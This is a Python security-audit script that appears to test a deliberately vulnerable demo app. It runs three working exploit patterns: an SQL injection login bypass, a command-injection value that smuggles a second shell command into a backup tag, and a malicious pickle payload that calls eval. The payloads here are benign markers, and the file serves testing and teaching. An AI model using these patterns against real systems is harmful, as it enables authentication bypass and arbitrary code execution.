import base64
import pickle
import os
from vulnerable_version.app import VulnerableVaultApp


def run_security_audit():
    app = VulnerableVaultApp(db_path="audit_vulnerable.db")

    print("=" * 65)
    print("EXECUTING SECURITY AUDIT & EXPLOIT SIMULATION (BASELINE)")
    print("=" * 65)

    # 1. Exploit SQL Injection
    print("\n[TEST 1] Testing SQL Injection (Authentication Bypass)")
    sqli_payload = "admin' --"
    res_sqli = app.authenticate_user(sqli_payload, "anything")
    print(f"Payload Used: username=\"{sqli_payload}\"")
    print(f"Result: {res_sqli}")
    if res_sqli.get("status") == "SUCCESS":
        print(">>> VULNERABILITY CONFIRMED: SQL Injection bypassed authentication!")

    # 2. Exploit Command Injection
    print("\n[TEST 2] Testing Command Injection")
    cmdi_payload = "test_tag; echo VULNERABILITY_EXPLOITED_CMD_INJECTION"
    res_cmdi = app.execute_system_backup(cmdi_payload)
    print(f"Payload Used: backup_tag=\"{cmdi_payload}\"")
    print(f"Result: {res_cmdi}")
    print(">>> VULNERABILITY CONFIRMED: Arbitrary shell command executed!")

    # 3. Exploit Insecure Deserialization
    print("\n[TEST 3] Testing Insecure Deserialization (Pickle Payload)")

    class ExploitPayload:
        def __reduce__(self):
            return (eval, ("'EXPLOITED_DESERIALIZATION_PAYLOAD'",))

    serialized_payload = base64.b64encode(pickle.dumps(ExploitPayload())).decode('utf-8')
    res_pickle = app.load_user_session(serialized_payload)
    print(f"Payload Used: Base64 Serialized Pickle Object")
    print(f"Result: {res_pickle}")
    print(">>> VULNERABILITY CONFIRMED: Arbitrary object/code execution via pickle!")

    # Cleanup audit DB
    if os.path.exists("audit_vulnerable.db"):
        os.remove("audit_vulnerable.db")


if __name__ == "__main__":
    run_security_audit()